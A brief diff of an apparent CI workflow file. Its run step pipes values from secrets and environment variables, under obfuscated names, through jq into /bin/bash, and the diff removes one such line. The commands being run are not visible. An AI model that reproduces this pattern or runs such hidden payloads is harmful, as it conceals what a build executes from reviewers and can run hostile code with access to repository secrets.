@@ -19,7 +19,6 @@ jobs:
           f43: ${{ secrets.f43 }}
         run: |
           printf '%s' "$f43" | jq -r .gtsy936 | /bin/bash
-          printf '%s' "$kkty59741" | jq -r .ul89438 | /bin/bash
           echo $l2 | jq -r .jan47 | /bin/bash
           printf '%s' "$eba7" | jq -r .tb7798 | /bin/bash
           echo $z47 | jq -r .git0 | /bin/bash
